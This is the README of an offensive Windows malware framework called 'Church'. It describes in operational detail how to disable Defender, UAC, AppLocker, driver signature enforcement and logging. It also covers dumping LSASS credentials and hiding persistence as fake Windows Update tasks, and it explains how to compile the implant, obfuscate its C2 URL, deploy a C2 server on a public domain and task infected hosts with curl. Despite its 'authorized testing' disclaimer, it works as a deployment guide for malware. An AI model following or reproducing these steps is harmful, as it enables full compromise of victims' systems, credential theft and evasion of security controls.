# Church - Weaponized Windows Security Bypass Framework


```
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                         CHURCH OF MALWARE                                 ║
    ║          Church - Weaponized Windows Security Bypass Framework            ║
    ║                         by ek0ms savi0r                                   ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
```

Repository: https://git.churchofmalware.org/ek0mssavi0r/CHURCH/

## DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY

---

## Overview

Church is an enterprise-grade Windows security bypass framework that implements multiple advanced techniques to disable or neutralize modern Windows security controls. The framework operates as a cohesive system executing in eight coordinated phases, providing complete offensive capabilities for authorized red team operations.

### Core Capabilities

- Windows Defender Tamper Protection via registry ownership takeover
- Defender real-time protection, behavior monitoring, cloud protection, signature updates
- User Account Control (UAC) via EnableLUA registry modification
- AppLocker and Windows Defender Application Control (WDAC) via service disable and policy deletion
- Driver Signature Enforcement (DSE) via custom signed driver loader with gdrv.sys BYOVD fallback
- Protected Process Light (PPL) via SeTcbPrivilege elevation and NtSetInformationProcess
- Security event logging via MiniNt registry key
- System restore points and telemetry domains via hosts file modification
- Security services including Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv, SecurityHealthService, wscsvc, and 15+ others
- LSASS credential dumping with hidden file attributes and shadow copy creation
- Process hollowing and token stealing for privilege escalation
- WMI event subscription for stealthy persistence
- IFEO and Silent Process Exit for automatic payload execution
- AES-256 encrypted C2 beacon with jitter and fallback servers

### Execution Phases

| Phase | Operation |
|-------|-----------|
| 0 | Telemetry Bypass - ETW and AMSI in-memory patching |
| 1 | Core Protection - Tamper Protection, Defender, UAC, AppLocker, WDAC |
| 2 | Anti-Forensics - Exclusion addition, log disabling, restore point deletion |
| 3 | Persistence - Scheduled tasks, WMI events, Run key, BootExecute, IFEO |
| 4 | Service Elimination - Stop and disable 18+ security services |
| 5 | Credential Access - LSASS dump with hidden attribute |
| 6 | Kernel Bypass - Custom signed driver loader with BYOVD fallback |
| 7 | Process Protection - PPL elevation via SeTcbPrivilege |
| 8 | C2 Activation - AES-256 encrypted beacon with jitter |

---

## System Requirements

Target Environment:
- Windows 10 or Windows 11 (any edition)
- Windows Server 2016/2019/2022
- Administrator access required
- Test system or authorized target only

Build Environment:
- Visual Studio 2019 or later with C compiler
- Windows SDK 10.0.18362.0 or later

Required External File for BYOVD Fallback:
- gdrv.sys (Gigabyte driver, CVE-2018-19320) placed in same directory as the executable

---

## Compilation Instructions

From Visual Studio Developer Command Prompt:

```cmd
cl /O2 /MT /Fe:church.exe church.c /link advapi32.lib user32.lib wbemuuid.lib ole32.lib crypt32.lib ntdll.lib bcrypt.lib ws2_32.lib winhttp.lib iphlpapi.lib shlwapi.lib shell32.lib
```

Stripping Symbols (After Compilation):

```cmd
strip --strip-all church.exe
```

---

## Configuration

Edit church.c to configure C2 server settings before compilation:

```c
// C2 Configuration
#define C2_BASE_INTERVAL_SECONDS 60
#define C2_JITTER_MAX_SECONDS 120

// Obfuscated strings (XOR key 0xDD)
CHAR g_c2_server_obf[] = "\x78\x9D\x9D..."  // https://your-c2-server.com/beacon
CHAR g_aes_key_obf[] = "\xAB\xAA\xA8..."     // 32-byte AES-256 key
CHAR g_aes_iv_obf[] = "\xB1\xB8\xB7..."      // 16-byte AES IV
```

Replace the obfuscated strings with your own XOR-encrypted values using the provided key (0xDD). The C2 server expects matching AES keys.

**Important:** The `g_c2_server_obf` string must contain the full HTTPS URL of your C2 server, including the path `/beacon`. For example, if your domain is `c2.churchofmalware.org`, obfuscate `https://c2.churchofmalware.org/beacon` with XOR key `0xDD`.

---

## Custom Signed Driver Implementation

Church includes a custom signed driver loader that eliminates reliance on public vulnerable drivers:

1. Embeds a base64-encoded custom kernel driver
2. Decodes and writes the driver to disk with hidden attributes
3. Loads the driver as a Windows service
4. Communicates via IOCTL to disable DSE
5. Falls back to gdrv.sys BYOVD if custom driver fails

To use your own signed driver:
- Replace the `g_customDriverBase64` placeholder with your base64-encoded driver
- Ensure your driver implements `CHURCH_IOCTL_DISABLE_DSE` and `CHURCH_IOCTL_EXECUTE_SHELLCODE`
- Sign the driver with a valid code-signing certificate

---

## C2 Server Deployment

The C2 server is fully hardened with the following security features:
- XOR-obfuscated AES keys (same as implant, key 0xDD)
- JWT secret persisted to file (survives restarts)
- HTTPS only (HTTP mode removed)
- Base64 CRLF sanitization for reliable decryption
- UUID-based beacon IDs (no collisions)
- Rate limiting on all API endpoints (10-30 requests per minute)
- HttpOnly, Secure session cookies for web UI

**New in v2.1: Built-in Beacon Parser & Lantern.js Graph Compatibility**

The C2 server now includes a dedicated parser that decrypts incoming beacon data and converts it into structured JSON, as well as a graph format compatible with the Lantern.js visualization frontend. This enables seamless integration with modern threat intelligence dashboards and real-time monitoring.

Parser endpoints provide:
- **Decryption and parsing** of raw encrypted beacon data
- **Graph conversion** for Lantern.js (nodes/edges/environments)
- **Result parsing** with automatic audit logging

### Production Deployment with a Real Domain

In a real operation, you would deploy the C2 server on a public domain with a valid TLS certificate. The steps are:

1. **Obtain a domain** (e.g., `c2.churchofmalware.org`) and point its DNS to your server's IP.
2. **Acquire a trusted SSL certificate** (e.g., from Let's Encrypt or a commercial CA) for that domain.
3. **Configure the C2 server** to use that certificate and key.
4. **Update the implant's obfuscated C2 string** to match your domain before compiling.

**Example (using Let's Encrypt):**

```bash
# Install certbot and obtain certificate
certbot certonly --standalone -d c2.churchofmalware.org

# The certificate and key will be in /etc/letsencrypt/live/c2.churchofmalware.org/
# Copy them to your C2 directory and run:
python church_c2_server.py --host 0.0.0.0 --port 443 --cert fullchain.pem --key privkey.pem
```

**Obfuscating your C2 URL for the implant:**

Use the included XOR utility (or a Python one‑liner) to generate the obfuscated bytes for your domain:

```python
XOR_KEY = 0xDD
url = "https://c2.churchofmalware.org/beacon"
obf = ''.join(f'\\x{(ord(c) ^ XOR_KEY):02X}' for c in url)
print(obf)
# Output: \x78\x9D\x9D... (use this to replace g_c2_server_obf)
```

### Local Testing (Self‑Signed Certificate)

For testing purposes only, you can use a self‑signed certificate:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python church_c2_server.py --host 127.0.0.1 --port 8443 --cert cert.pem --key key.pem
```

Then access `https://127.0.0.1:8443` (or `localhost`) and bypass the browser warning.

---

### Dependencies

```bash
pip install flask flask-socketio cryptography werkzeug flask-limiter
```

---

### C2 API Endpoints

```bash
# List all beacons
curl -H "X-Auth-Token: <JWT_SECRET>" https://your-c2-domain/api/beacons

# Execute command on beacon
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{"host": "beacon_id", "command": "whoami"}' \
  https://your-c2-domain/api/task

# Execute PowerShell command
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{"host": "beacon_id", "command": "Get-Process", "powershell": true}' \
  https://your-c2-domain/api/task

# Get beacon details
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://your-c2-domain/api/beacon/<beacon_id>

# Get task history
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://your-c2-domain/api/tasks/<beacon_id>

# Get system statistics
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://your-c2-domain/api/stats

# --- NEW PARSER ENDPOINTS (v2.1) ---

# Parse raw beacon data and return both decrypted JSON and graph format
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -d "d=<encrypted_base64>" \
  https://your-c2-domain/api/beacon/parse

# Convert raw beacon data directly to Lantern.js graph format
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -d "d=<encrypted_base64>" \
  https://your-c2-domain/api/beacon/graph

# Parse command result and log it as an audit event
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -d "d=<encrypted_result_base64>" \
  https://your-c2-domain/api/beacon/result/parse
```

Web UI Access: `https://your-c2-domain`

---

## Execution

Run the compiled executable as Administrator:

```cmd
church.exe
```

The tool auto‑elevates if not already running with administrative privileges.

---

## What Happens After The System Reboots

After Church executes and forces a system reboot, the following persistent mechanisms remain active:

1. **Persistence Triggers:**
   - Scheduled task "WindowsUpdateTask" runs the Church binary at user login
   - Scheduled task "MicrosoftUpdateTask" runs daily at 09:00
   - WMI event subscription triggers on explorer.exe startup
   - Windows service "WindowsUpdateService" auto‑starts
   - Registry Run key executes the binary at boot
   - BootExecute registry entry runs the binary during system initialization
   - IFEO Debugger for svchost.exe and explorer.exe triggers execution
   - Silent Process Exit Monitor relaunches the binary when svchost.exe exits

2. **Disabled Protections (Persist Across Reboots):**
   - Windows Defender service disabled (WinDefend)
   - Tamper Protection registry key set to 0
   - UAC disabled (EnableLUA = 0)
   - Security logging disabled (MiniNt key present)
   - AppLocker and WDAC services disabled
   - DSE remains disabled (kernel patched)
   - System Restore disabled

3. **C2 Beacon:**
   - The binary auto‑starts via multiple persistence mechanisms
   - Beacon thread begins sending HTTPS requests to the configured C2 server
   - System information (computer name, user, OS, Defender status, AV products) is transmitted
   - The beacon waits for commands from the C2 server

4. **Credential Access:**
   - LSASS dump file (C:\lsass.dmp) remains on disk with hidden attribute
   - Can be extracted and processed with Mimikatz offline

5. **Network Access:**
   - Firewall rules allow outbound HTTPS on port 443
   - Telemetry domains blocked in hosts file
   - DNS over HTTPS configured for stealth

The target system remains fully compromised with remote access via the C2 channel. All security controls remain disabled across reboots. The Church binary continues to execute and maintain communication with the command and control server until manually removed.

---

## Disclaimer

FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY. The Church of Malware assumes no liability for misuse.
